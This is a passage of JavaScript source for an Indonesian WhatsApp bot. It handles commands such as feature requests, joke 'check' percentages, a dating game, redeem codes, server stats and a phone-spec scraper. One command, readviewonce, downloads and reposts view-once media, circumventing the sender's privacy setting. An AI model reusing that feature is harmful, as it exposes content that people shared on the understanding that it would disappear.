  reply(`👑 Kamu adalah *User Premium*\n\n📅 Expired pada: ${tanggal}\n⏳ Sisa waktu: ${formatSisaWaktu(sisa)}`);
}
break;
case 'req':
case 'request':
case 'saran': {
if (isBan) return XRB()
await XReaction()
 if (!args[0]) return reply(`Contoh:\n${prefix + command} Req fitur loli detector`);

 const text = args.join(' ');
 const pengirim = `@${m.sender.split('@')[0]}`;
 const nama = m.pushName || 'User';
 const url = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=Dari+${encodeURIComponent(nama)}&text=${encodeURIComponent(text)}`;
 const captionOwner = `🛠️ *Request Fitur Baru!*\n\n"${text}"\n\n📩 Dari: ${pengirim}`;

 try {
 await Alice.sendMessage(global.owner + '@s.whatsapp.net', {
 image: { url },
 caption: captionOwner,
 mentions: [m.sender]
 });

 reply(`✅ Request kamu sudah dikirim ke Owner`);
 } catch (err) {
 console.error('❌ Gagal kirim request:', err);
 reply('❌ Gagal mengirim request. Coba lagi nanti ya!');
 }
}
break
case 'report': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: .report fitur .play error`)
  
  let teks = `📢 *LAPORAN BUG*\n\n`
  teks += `👤 *Pelapor:* @${m.sender.split('@')[0]}\n`
  teks += `💬 *Pesan:* ${text}\n`
  teks += `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}`

  // ID Owner Bot (bisa lebih dari satu)
  const ownerJid = [global.owner + '@s.whatsapp.net'] // ganti dengan nomor owner

  for (let id of ownerJid) {
    await Alice.sendMessage(id, {
      text: teks,
      mentions: [m.sender]
    }, { quoted: m })
  }

  reply('✅ Laporan bug kamu sudah dikirim ke owner. Terima kasih!')
}
break
case 'rvo':
case 'readvo':
case 'readviewonce': {
if (isBan) return XRB()
await XReaction()
    let msg = m.quoted
    let type = msg.mtype
    if (!msg.viewOnce) return reply('Itu bukan pesan view-once!')
    
    let media = await downloadContentFromMessage(
        msg, 
        type === 'imageMessage' ? 'image' : 
        type === 'videoMessage' ? 'video' : 'audio'
    )

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    let sendOptions = { quoted: m }
    if (/video/.test(type)) {
        return Alice.sendMessage(m.chat, { video: buffer, caption: msg.caption || '' }, sendOptions)
    } else if (/image/.test(type)) {
        return Alice.sendMessage(m.chat, { image: buffer, caption: msg.caption || '' }, sendOptions)
    } else if (/audio/.test(type)) {
        return Alice.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }, sendOptions)
    }
}
break
      case "handsomecheck":
        if (!text) {
          return reply(`Tag Someone, Contoh : ${XyrooRynzz} XyrooRynzz`);
        }
        const gan = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100"];
        const teng = gan[Math.floor(Math.random() * gan.length)];
        Alice.sendMessage(m.chat, {
          text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
        }, {
          quoted: m
        });
        break;
      case "beautifulcheck":
        if (!text) {
          return reply(`Tag Someone, Contoh : ${prefix + command} XyrooRynzz`);
        }
        const can = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100"];
        const tik = can[Math.floor(Math.random() * can.length)];
        Alice.sendMessage(m.chat, {
          text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*`
        }, {
          quoted: m
        });
        break;
      case "charactercheck":
        if (!text) {
          return reply(`Tag Someone, Contoh : ${prefix + command} XyrooRynzz`);
        }
        const xeony = ["Compassionate", "Generous", "Grumpy", "Forgiving", "Obedient", "Good", "Simp", "Kind-Hearted", "patient", "UwU", "top, anyway", "Helpful"];
        const taky = xeony[Math.floor(Math.random() * xeony.length)];
        Alice.sendMessage(m.chat, {
          text: `Character Check : ${q}\nAnswer : *${taky}*`
        }, {
          quoted: m
        });
        break;
      case "awesomecheck":
      case "greatcheck":
      case "gaycheck":
      case "cutecheck":
      case "lesbicheck":
      case "lesbiancheck":
      case "hornycheck":
      case "prettycheck":
      case "lovelycheck":
      case "uglycheck":
        const cex = body.slice(0);
        const cek1 = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100"];
        const cek2 = cek1[Math.floor(Math.random() * cek1.length)];
        if (mentionByreply) {
          Alice.sendMessage(m.chat, {
            text: `${"Question : *" + cex + "*\nChecker : "}@${mentionByreply.split("@")[0]}
Answer : ${cek2}%`,
            mentions: [mentionByreply]
          }, {
            quoted: m
          });
        } else if (mentionByTag[0]) {
          Alice.sendMessage(m.chat, {
            text: `${"Question : *" + cex + "*\nChecker : "}@${mentionByTag[0].split("@")[0]}
Answer : ${cek2}%`,
            mentions: [mentionByTag[0]]
          }, {
            quoted: m
          });
        } else if (!mentionByreply && !mentionByTag[0]) {
          Alice.sendMessage(m.chat, {
            text: `${"Question : *" + cex + "*\nChecker : "}@${sender.split("@")[0]}
Answer : ${cek2}%`,
            mentions: [sender]
          }, {
            quoted: m
          });
        }
        break;
case'q': case 'quoted': {
				if (!m.quoted) return reply('reply Pesannya!')
				if (text) {
					delete m.quoted.chat
					await reply({ forward: m.quoted })
				} else {
					const anu = await m.getQuotedObj()
					if (!anu) return reply('Format Tidak Tersedia!')
					if (!anu.quoted) return reply('Pesan Yang Anda reply Tidak Mengandung reply')
					await Alice.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
				}
			}
			break

case "listhadiah":{
if (!isOwner) return XRO()
if (db.data.settings.hadiah.length < 1) return reply("Tidak ada code hadiah")
var tek = `*乂 LIST CODE HADIAH*\n\nTotal : *${db.data.settings.hadiah.length}*\n\n`
db.data.settings.hadiah.forEach((e) => {
tek += ` ◦ ${e}\n`
})
reply(teks)
}
break

case "redeemcode":{
if (isBan) return XRB()
await XReaction()
if (!args[0]) return reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return reply("*Code Redeem* wajib huruf kecil semua!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return reply("*Code* tersebut sudah digunakan!")
if (!db.data.settings.hadiah.includes(args[0])) return reply("*Code* tidak valid!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
let h1 = randomNumber(10, 20)
db.data.users[m.sender].limit += h1
var teks = `Selamat kepada @${m.sender.split("@")[0]} 🎉

kamu mendapatkan *${h1} Limit* dari *Code Redeem "${args[0]}"*`
await reply(`Berhasil mengambil hadiah *${h1} Limit* dari *Code Redeem ${args[0]}*`).then(() => {
Alice.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdreply: { thumbnailUrl: thumbnailReply, title: "© Message System Notifikasi", body: null, sourceUrl: xtele, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
})}
break

case "buathadiah":{
if (!isOwner) return XRO()
if (isNaN(args[0])) return reply('Jumlah Kode Hadiah')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
reply(teks)
}
break

			case 'tembak': {
if (isBan) return XRB()
await XReaction()
				if (!m.isGroup) return XRG()
				Alice.jadian = Alice.jadian ? Alice.jadian : {}
				let user = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!text) return reply(`tag/reply seseorang, contoh:\n${XyrooRynzz} @628888`)
				if (user === m.sender) return reply("njrrr stresss")
				if (user === botNumber) return reply("njrrr sama bot, edan😂")
				let pasangan = global.db.data.users[user].pacar
				let pasangan2 = global.db.data.users[m.sender].pacar
				if (pasangan2 === user) {
					reply(`itu kan pacarr lu njrr`)
				} else if (pasangan) {
					reply(`udah ada pacar nya njrrr\n\nwoii @${pasangan.split("@")[0]} ayangmu mau di ambil`)
				} else if (pasangan2) {
					reply(`lakh, mau selingkuh?\n\nwoii @${pasangan2.split("@")[0]} liat nih, dia mau selingkuh`)
				} else {
                    let ktnmbk = [
                        "ada saat di mana aku nggak suka sendiri. tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.", "aku baru sadar ternyata selama ini kamu kaya! kaya yang aku cari selama ini. kamu mau nggak jadi pacarku?", "aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.", "aku boleh kirim cv ke kamu nggak? soalnya aku mau ngelamar jadi pacar.", "aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?", "aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. maukah kamu menerima cintaku?", "aku ingin bilang sesuatu. udah lama aku suka sama kamu, tapi aku nggak berani ngomong. jadi, kuputuskan untuk wa saja. aku pengin kamu jadi pacarku.", "aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. aku mencintaimu, maukah kamu menjadi pacarku?", "aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. maukah kau jadi pacarku?", "aku mau chat serius sama kamu. selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. kalau nggak keberatan, kamu mau jadi pacarku?", "aku melihatmu dan melihat sisa hidupku di depan mataku.", "aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.", "aku menyukaimu dari dulu. kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. akan sempurna jika kamu yang menjadi spesial di hati.", "aku naksir banget sama kamu. maukah kamu jadi milikku?", "aku nggak ada ngabarin kamu bukan karena aku nggak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. mungkin kamu akan kaget mendengarnya. selama ini aku menyukaimu.", "aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.", "aku nggak tahu sampai kapan usiaku berakhir. yang aku tahu, cintaku ini selamanya hanya untukmu.", "aku sangat menikmati waktu yang dihabiskan bersama hari ini. kita juga sudah lama saling mengenal. di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.", "aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. maukah kamu menjadi kekasihku?", "aku siapkan mental untuk hari ini. kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.", "aku tahu kita nggak seumur, tapi bolehkan aku seumur hidup sama kamu?", "aku tahu kita sudah lama sahabatan. tapi nggak salah kan kalau aku suka sama kamu? apa pun jawaban kamu aku terima. yang terpenting itu jujur dari hati aku yang terdalam.", "aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. jika kau mengerti akan kode ini maka kita akan bersama.", "aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.", "apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. karena berada di sampingmu, anugerah terindah bagiku. jadilah kekasihku, hey kamu.", "atas izin allah dan restu mama papa, kamu mau nggak jadi pacarku?", "bagaimana kalau kita jadi komplotan pencuri? aku mencuri hatimu dan kau mencuri hatiku.", "bahagia itu kalau aku dan kamu telah menjadi kita.", "besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. biar aku ada kerjaan buat selalu mikirin kamu.", "biarkan aku membuatmu bahagia selamanya. kamu hanya perlu melakukan satu hal: jatuh cinta denganku.", "biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!", "biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?", "bisakah kamu memberiku arahan ke hatimu? sepertinya aku telah kehilangan diriku di matamu.", "bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. dijawab ya.", "caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. aku mau kamu jadi milikku.", "cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.", "cintaku ke kamu tuh kayak angka 5 sampai 10. nggak ada duanya. aku mau kamu jadi satu-satunya wanita di hatiku.", "cowok mana yang berani-beraninya nyakitin kamu. sini aku obati, asal kamu mau jadi pacar aku.", "hai, kamu lagi ngapain? coba deh keluar rumah dan lihat bulan malam ini. cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?", "hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. senyummu menerangi hidupku dan semua kegelapan menghilang. maukah kamu menjadi milikku?", "ini bukan rayuan, tapi ini yang aku rasakan. aku ingin bertukar tulang denganmu. aku jadi tulang punggungmu, kamu jadi tulang rusukku. jadian yuk!", "ini cintaku, ambillah. ini jiwaku, gunakan itu. ini hatiku, jangan hancurkan. ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.", "izinkan aku mengatakan sesuatu yang menurutku sangat penting. hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. tetaplah di sana dan jadilah kekasihku. mau?", "jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. biarkan aku melakukannya sekarang.", "kalau aku matahari, kamu mau nggak jadi langitku? biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.", "kalau kamu membuka pesan ini, berarti kamu suka sama aku. kalau kamu membalas pesan ini, artinya kamu sayang sama aku. kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.", "kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.", "kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. aku ingin kamu selalu bersamaku. aku mencintaimu.", "kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.", "kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. maukah kamu jadi pacar aku?", "kamu kenal iwan nggak? iwan to be your boy friend.", "kamu mau nggak jadi matahari di kehidupanku? kalau mau, menjauhlah 149.6 juta km dari aku sekarang!", "kamu nggak capek hts-an sama aku? aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. kita pacaran aja, yuk?", "kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. iya, aku.", "kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. apakah kamu akan membiarkan aku menjadi orangnya?", "kamu tahu enggak kenapa aku ngambil jurusan elektro? karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.", "kamu tahu kenapa hari ini aku menyatakan semua ini padamu? karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.", "kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?", "kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. aku mau kamu jadi milikku.", "kepada cewek incaran bukanlah perkara yang mudah. ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.", "ketika aku bertemu denganmu, aku tak peduli dengan semuanya. namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. dan apakah ini cinta?", "ketika engkau memandangku, engkau akan melihat fisikku. tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.", "ketika hawa tercipta buat sang adam, begitu indah kehidupan mereka. izinkan aku menjadi sang adam/hawa buatmu karena aku sangat mencintaimu.", "ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.", "kita udah saling tahu masa lalu masing-masing. tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?", "ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. resah jika kamu tak menjadi milikku selamanya.", "lebih spesial dari nasi goreng, lebih indah dari purnama. ya, jika kamu yang temani akhir hidupku.", "maaf sebelumnya karena cuma bisa bilang lewat wa. sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. mau?", "makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.", "makan tahu bumbu petis. merenung sambil makan buah duku. aku bukan lelaki yang romantis. namun, maukah kau jadi pacarku?", "makasih, ya, selama ini sudah mau temani aku. entah itu dalam suka ataupun duka. tapi sekarang aku mau kamu berubah. aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.", "malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.", "mau jadi pacarku nggak, lagi gabut nih. coba dulu 1 bulan kalau nyaman lanjut deh.", "menjadi teman memang menyenangkan. akan lebih membahagiakan jika kamu menjadi milikku.", "meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - zarry hendrik", "meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.", "mungkin aku bukan obama, tapi aku senang kalau bisa manggil kamu, o sayang. kamu mau nggak mulai saat ini aku panggil seperti itu?", "mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. tapi satu yang aku sanggup, membuatmu bahagia. izinkan aku membuktikannya, ya!", "neng, bakar-bakaran yuk! | bakar apa? | kita bakar masa lalu dan buka lembaran baru dengan cinta kita.", "nggak perlu basa basi. kita udah kenal lama, aku suka kamu apa adanya. jadian yuk!", "pepatah mengatakan, empat sehat lima sempurna. namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.", "saatnya aku mengungkapkan perasaan yang terdalam kepadamu. aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.", "saking jatuh cintanya aku sama kamu. mendengar kamu kentut aja aku sudah bahagia.", "satu tambah satu sama dengan dua. aku tanpamu nggak bisa apa-apa. satu dua tiga sepuluh. aku maunya kamu jadi pacarku.", "secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.", "sejak kenal kamu, bawaannya pengin belajar terus. belajar jadi yang terbaik. untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?", "senjata bertuah amatlah sakti. kalah oleh iman nan hakiki. maukah kau jadi orang yang aku kasihi? aku janji cintaku sampai mati.", "seseorang bermimpi tentangmu setiap malam. seseorang tidak bisa bernapas tanpamu, kesepian. seseorang berharap suatu hari kau akan melihatnya. seseorang itu adalah aku.", "setelah hari berlalu, aku yakin kamu pilihanku.", "setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. aku mencintaimu.", "suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. perempuan itu adalah kamu.", "suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?", "tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.", "tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.", "tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.", "tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. itu adalah kamu.", "telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. karena aku mau kamu jadi pacar aku?", "tidak peduli seberapa sederhanya dan ketidakjelasan kamu. tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. aku mau kamu jadi pacarku.", "untuk apa memajang foto berdua? yang aku mau fotomu ada dalam buku nikahku kelak. maukah kamu jadi pacarku?"
];
					let katakata = await pickRandom(ktnmbk)
					let teks = `love Message...\n\n> @${m.sender.split("@")[0]}\n❤️❤️\n@${user.split("@")[0]}\n\n"${katakata}"`
					Alice.jadian[user] = [
						reply(teks),
						m.sender
					]
					reply(`kamu baru saja mengajak @${user.split("@")[0]} jadian\n\n@${user.split("@")[0]} silahkan beri keputusan🎉\n${Xyroo}terima atau ${Xyroo}tolak`)
				}
			}
			break

			case 'terima': {
if (isBan) return XRB()
await XReaction()
				if (!m.isGroup) return XRG()
				if (Alice.jadian[m.sender]) {
					let user = Alice.jadian[m.sender][1]
					global.db.data.users[user].pacar = m.sender
					global.db.data.users[m.sender].pacar = user
					reply(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng 🙈😋`)
					delete Alice.jadian[m.sender]
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'tolak': {
if (isBan) return XRB()
await XReaction()
				if (!m.isGroup) return XRG()
				if (Alice.jadian[m.sender]) {
					let user = Alice.jadian[m.sender][1]
					reply(`@${user.split("@")[0]} wowkaowka di tolak`)
					delete Alice.jadian[m.sender]
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'putus': {
if (isBan) return XRB()
await XReaction()
				if (!m.isGroup) return XRG()
				let pasangan = global.db.data.users[m.sender].pacar
				if (pasangan) {
					global.db.data.users[m.sender].pacar = ""
					global.db.data.users[pasangan].pacar = ""
					reply(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'cekpacar': {
if (isBan) return XRB()
await XReaction()
				if (!m.isGroup) return XRG()
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return reply(`tag/reply seseorang, contoh: ${XyrooRynzz} @628888`)
					let pasangan = global.db.data.users[user].pacar
					if (pasangan) {
						reply(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
					} else {
						reply(`@${user.split("@")[0]} masih jomblo`)
					}
				} catch (error) {
                      let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					reply(`@${user.split("@")[0]} tidak ada didalam database njrrr`)
				}
			}
			break

case 'ping':
case 'info':
case 'storage':
case 'server':
case 'srvinfo': {
  const os = require('os')
  const nou = require('node-os-utils')

  function formatp(bytes) {
    if (bytes < 1024) return `${bytes} B`
    const kb = bytes / 1024
    if (kb < 1024) return `${kb.toFixed(2)} KB`
    const mb = kb / 1024
    if (mb < 1024) return `${mb.toFixed(2)} MB`
    const gb = mb / 1024
    return `${gb.toFixed(2)} GB`
  }

  async function getServerInfo() {
    try {
      const osType = nou.os.type()
      const release = os.release()
      const arch = os.arch()
      const nodeVersion = process.version
      const ip = await nou.os.ip()

      const cpus = os.cpus()
      const cpuModel = cpus[0].model
      const coreCount = cpus.length
      const cpu = cpus.reduce((acc, cpu) => {
        acc.total += Object.values(cpu.times).reduce((a, b) => a + b, 0)
        acc.speed += cpu.speed
        acc.times.user += cpu.times.user
        acc.times.nice += cpu.times.nice
        acc.times.sys += cpu.times.sys
        acc.times.idle += cpu.times.idle
        acc.times.irq += cpu.times.irq
        return acc
      }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } })
      const cpuUsage = ((cpu.times.user + cpu.times.sys) / cpu.total * 100).toFixed(2) + '%'
      const loadAverage = os.loadavg()
      const totalMem = os.totalmem()
      const freeMem = os.freemem()
      const usedMem = totalMem - freeMem
      const storageInfo = await nou.drive.info()
      const speed = require('performance-now')
      const timestamp = speed()
      const latensi = speed() - timestamp
      const responseText = `
 *INFO SERVER*
• OS: ${osType} (${release})
• Arsitektur: ${arch}
• Versi Node.js: ${nodeVersion}

 *CPU SISTEM*
• Model: ${cpuModel}
• Kecepatan: ${cpu.speed} MHz
• Beban CPU: ${cpuUsage} (${coreCount} Core)
• Load Average: ${loadAverage.join(', ')}

 *MEMORI (RAM)*
• Total: ${formatp(totalMem)}
• Digunakan: ${formatp(usedMem)}
• Tersedia: ${formatp(freeMem)}

 *PENYIMPANAN*
• Total: ${storageInfo.totalGb} GB
• Digunakan: ${storageInfo.usedGb} GB (${storageInfo.usedPercentage}%)
• Tersedia: ${storageInfo.freeGb} GB (${storageInfo.freePercentage}%)

 *PING*
• Latensi: ${latensi.toFixed(4)} detik
• Uptime Vps: ${runtime(os.uptime())}
`
      return responseText.trim()
    } catch (error) {
      console.error('Error mendapatkan informasi server:', error)
      return 'Terjadi kesalahan dalam mendapatkan informasi server.'
    }
  }

  getServerInfo().then(responseText => {
    Alice.sendMessage(m.chat, { text: responseText }, { quoted: m })
  })
}
break

case 'gsmarena': {
if (isBan) return XRB()
await XReaction()
 if (args.length === 0) {
 reply('Silakan masukkan nama perangkat yang ingin dicari.');
 return;
 }

 async function gsmSearch(q) {
 try {
 const response = await axios({
 method: "get",
 url: `https://gsmarena.com/results.php3?sQuickSearch=yes&sName=${q}`
 });
 const $ = cheerio.load(response.data);
 const result = [];
 
 const device = $(".makers").find("li");
 device.each((i, e) => {
 const img = $(e).find("img");
 result.push({
 id: $(e).find("a").attr("href").replace(".php", ""),
 name: $(e).find("span").html().split("<br>").join(" "),
 description: img.attr("title")
 });
 });
 return result;
 } catch (error) {
 console.error(error);
 throw error;
 }
 }

 gsmSearch(q).then(results => {
 if (results.length === 0) {
 reply('Tidak ada hasil yang ditemukan.');
 return;
 }
 
 let replyText = `Hasil pencarian untuk "${q}":\n\n`;
 results.forEach((device, index) => {
 replyText += `${index + 1}. ${device.name}\nDeskripsi: ${device.description}\nLink: https://gsmarena.com/${device.id}.php\n\n`;
 });
 
 reply(replyText);
 }).catch(error => {
 reply('Terjadi kesalahan saat mencari perangkat.');
 console.error(error);
 });
}
break

case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
if (isBan) return XRB()
await XReaction()
     if (!text.includes('|')) return reply(`Example: ${XyrooRynzz} jakarta|bandung`);
 
 let [from, to] = text.split('|').map(v => v.trim());
 let xyroorinzi = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
      try {
 let response = await fetch(xyroorinzi);
 let data = await response.json();
 if (data.status !== 200) return reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
    let result = data.result;
    let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
